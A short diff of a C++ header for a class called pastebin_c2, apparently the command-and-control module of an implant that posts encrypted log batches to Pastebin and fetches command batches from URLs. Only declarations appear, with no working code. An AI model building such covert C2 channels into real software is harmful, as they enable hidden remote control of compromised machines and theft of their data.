@@ -7,23 +7,24 @@
 #include <string>
 #include <vector>
 
+
 class pastebin_c2 {
 public:
     pastebin_c2(Comm* comm_module, crypto_encoder* encoder);
     
     // Posts a log batch to Pastebin
+    pastebin_c2(Comm* comm_module, crypto_encoder* encoder, const std::wstring& base_url);
+    
     std::string post_logs(const LogBatch& logs);
-
-    // Fetches and parses a command batch from a URL
     CommandBatch fetch_commands(const std::wstring& url);
 
-    // Syncs time from the server headers
+private:
     void sync_time();
 
-private:
     Comm* comm_module;
     crypto_encoder* encoder;
-    uint64_t last_synced_time;
+    std::time_t last_synced_time;
+    std::wstring base_url;
 };
 
 #endif // PASTEBIN_H
